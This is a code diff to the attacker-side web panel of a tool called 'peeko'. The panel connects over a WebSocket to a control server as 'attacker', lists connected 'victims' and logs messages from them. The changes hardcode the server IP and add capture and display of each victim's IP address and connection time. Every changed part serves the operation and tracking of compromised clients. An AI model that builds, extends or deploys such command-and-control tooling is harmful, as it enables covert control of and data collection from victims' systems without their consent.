@@ -94,14 +94,16 @@
   </div>
 
   <footer>
-    peeko v1.0 – by b3rito & GioPpeTto
+    peeko v1.0 – by b3rito at mes3hacklab  & GioPpeTto
   </footer>
 
   <script>
-    const socket = new WebSocket("wss://SERVER-IP:8443/ws");
+    const socket = new WebSocket("wss://192.168.1.12:8443/ws");
     const victimSelect = document.querySelector("#victimSelect");
     const logOutput = document.querySelector("#response");
     const logLines = [];
+    // Store additional metadata for each victim.
+    const victimsData = {};
 
     socket.onopen = () => {
       socket.send("attacker");
@@ -112,8 +114,8 @@
       const msg = event.data;
       const interesting = ["[✅]", "[📄]", "[🟢]", "[🔴]"];
 
-      // If the message comes from a victim, it may start with a victim prefix, e.g. "[victim-1] "
-      // Strip that prefix if present so that we can detect the interesting prefix.
+      // Check if the message comes from a victim (it may start with a victim prefix)
+      // and remove that prefix for the purpose of checking interesting messages.
       let toCheck = msg;
       if (msg.startsWith("[") && msg.indexOf("]") !== -1) {
         const firstPrefix = msg.substring(0, msg.indexOf("]") + 1);
@@ -122,17 +124,19 @@
         }
       }
 
-      // Log the message if it starts with one of the interesting prefixes
+      // Log the message if it starts with an interesting prefix.
       if (interesting.some(prefix => toCheck.startsWith(prefix))) {
         log(msg);
       }
 
-      // Process victim connection/disconnection events using the original message
+      // Process victim connection events.
+      // Expected format: "[🟢] Victim connected: victim-1 (192.168.1.14)"
       if (msg.startsWith("[🟢] Victim connected: ")) {
-        const match = msg.match(/Victim connected: (victim-\d+)/);
-        if (match) addVictim(match[1]);
+        const match = msg.match(/Victim connected: (victim-\d+)\s+\(([^)]+)\)/);
+        if (match) addVictim(match[1], match[2]);
       }
 
+      // Process victim disconnection events.
       if (msg.startsWith("[🔴] Victim disconnected: ")) {
         const match = msg.match(/Victim disconnected: (victim-\d+)/);
         if (match) removeVictim(match[1]);
@@ -167,18 +171,26 @@
       }
     }
 
-    function addVictim(id) {
+    // Updated addVictim function to store and display metadata.
+    function addVictim(id, ip) {
+      victimsData[id] = {
+        ip: ip,
+        connectionTime: new Date()
+      };
       const exists = [...victimSelect.options].some(opt => opt.value === id);
       if (!exists) {
         const opt = document.createElement("option");
         opt.value = id;
-        opt.textContent = id;
+        // Display both the victim id and IP address.
+        opt.textContent = `${id} (${ip})`;
         if (victimSelect.options.length === 1) victimSelect.selectedIndex = 1;
         victimSelect.appendChild(opt);
       }
     }
 
+    // Updated removeVictim function to delete metadata.
     function removeVictim(id) {
+      delete victimsData[id];
       [...victimSelect.options].forEach(opt => {
         if (opt.value === id) opt.remove();
       });
